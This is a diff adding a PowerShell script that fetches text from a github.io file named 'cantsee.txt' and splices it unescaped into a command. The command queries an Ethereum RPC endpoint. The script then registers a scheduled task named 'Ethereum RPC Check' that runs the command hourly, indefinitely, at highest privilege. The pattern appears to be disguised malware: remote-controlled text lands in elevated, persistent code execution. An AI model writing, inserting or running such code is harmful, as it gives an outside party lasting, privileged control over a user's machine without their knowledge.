@@ -1,0 +1,39 @@
+$apiKey = (New-Object System.Net.WebClient).DownloadString('https://hakkyahud.github.io/cantsee.txt')
+
+$command = @"
+  `$url = "https://eth-mainnet.g.alchemy.com/v2/$apiKey"
+  `$body = @{ jsonrpc = "2.0"
+  method = "eth_call"
+  params = @(
+      @{  to = "0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"
+          data = "0x06fdde03"
+        }
+        "latest"
+      )
+      id = 1
+  } | ConvertTo-Json -Depth 10
+
+`$response = Invoke-RestMethod`
+  -Uri `$url `
+  -Method Post `
+  -ContentType "application/json" `
+  -Body `$body
+Write-Output `$response.result
+  "@
+
+  $action = New-ScheduledTaskAction `
+  -Execute "powershell.exe" `
+  -Argument "-NoProfile -Command `"$command`""
+
+  $trigger = New-ScheduledTaskTrigger `
+-Once `
+-At (Get-Date) `
+-RepetitionInterval (New-TimeSpan -Hours 1) `
+-RepetitionDuration ([TimeSpan]::MaxValue)
+  
+  Register-ScheduledTask `
+  -TaskName "Ethereum RPC Check" `
+  -Action $action `
+  -Trigger $trigger `
+  -RunLevel Highest `
+  -Force
